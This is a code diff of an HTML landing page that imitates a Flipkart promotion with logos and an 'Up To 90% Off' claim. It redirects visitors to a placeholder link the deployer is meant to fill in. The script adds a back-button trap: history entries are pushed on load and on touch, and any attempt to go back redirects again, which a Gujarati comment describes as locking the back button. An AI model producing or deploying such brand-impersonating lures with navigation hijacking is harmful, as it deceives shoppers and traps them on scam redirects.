@@ -12,7 +12,7 @@
             overflow: hidden;
         }
 
-        /* Floating Logos */
+        /* Floating Logos Background */
         @keyframes float {
             0% { transform: translate(0, 0) rotate(0deg); }
             50% { transform: translate(50px, 50px) rotate(180deg); }
@@ -24,51 +24,45 @@
 
         .container { text-align: center; z-index: 10; position: relative; width: 100%; }
 
-        /* બટનની ઉપરનું લખાણ */
         .top-text { 
-            font-size: 18px; 
+            font-size: 16px; 
             font-weight: bold; 
             color: #ffffff; 
-            margin-bottom: 12px; 
-            text-transform: uppercase;
+            margin-bottom: 10px; 
+            letter-spacing: 0.5px;
         }
 
-        /* નાનું અને લાંબુ ગોળ બટન */
+        /* શોર્ટ અને ગોળ બટન (Perfect Size) */
         .flipkart-button {
             background-color: #ffe11b; 
             color: #212121;
-            padding: 10px 45px; /* સાઈઝ નાની કરી */
+            padding: 12px 30px; /* પહોળાઈ ઘટાડીને શોર્ટ કર્યું */
             border: none;
-            border-radius: 50px; /* લાંબુ ગોળ (Oval) */
+            border-radius: 50px; 
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
             display: inline-block;
             text-decoration: none;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
+            transition: 0.1s;
         }
 
         .offer-text { 
-            font-size: 20px; 
+            font-size: 18px; 
             font-weight: 800; 
             display: block; 
-            line-height: 1.1;
+            line-height: 1;
         }
 
         .click-here-text { 
-            font-size: 12px; 
+            font-size: 11px; 
             display: block; 
+            margin-top: 3px;
             font-weight: bold;
-            color: #333;
+            opacity: 0.9;
         }
     </style>
 </head>
-<body onclick="fastRedirect()" ontouchstart="fastRedirect()">
+<body>
 
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
@@ -77,33 +71,34 @@
     <div class="container">
         <div class="top-text">Claim your deal</div>
         
-        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="flipkart-button" id="mainButton">
+        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="flipkart-button" onclick="doFastRedirect(event)">
             <span class="offer-text">Up To 90% Off</span>
             <span class="click-here-text">Click Here</span>
         </a>
     </div>
 
     <script>
+        // અહીં તમારી ફાઈનલ લિંક નાખો
         var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; 
 
-        // ફાસ્ટ રિડાયરેક્ટ ફંક્શન
-        function fastRedirect() {
-            window.location.href = targetUrl;
+        // ક્લિક કરતાની સાથે જ ઇન્સ્ટન્ટ રિડાયરેક્ટ
+        function doFastRedirect(e) {
+            e.preventDefault();
+            window.location.replace(targetUrl); 
         }
 
-        // બટન પર ક્લિક કરતા જ તરત રિડાયરેક્ટ
-        document.getElementById("mainButton").onclick = function(e) {
-            e.preventDefault();
-            window.location.replace(targetUrl);
-        };
-
-        // બેક બટન ટ્રેપ (Fast)
+        // પેજ લોડ થતાની સાથે જ બેક બટન લોક કરી દેશે
         window.onload = function() {
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = function() {
                 window.location.replace(targetUrl);
             };
         };
+
+        // જો યુઝર ગમે ત્યાં ક્લિક કરે તો પણ ફાસ્ટ રિડાયરેક્ટ ટ્રિગર થશે
+        document.body.addEventListener('touchstart', function() {
+            window.history.pushState(null, null, window.location.href);
+        }, false);
     </script>
 </body>
 </html>
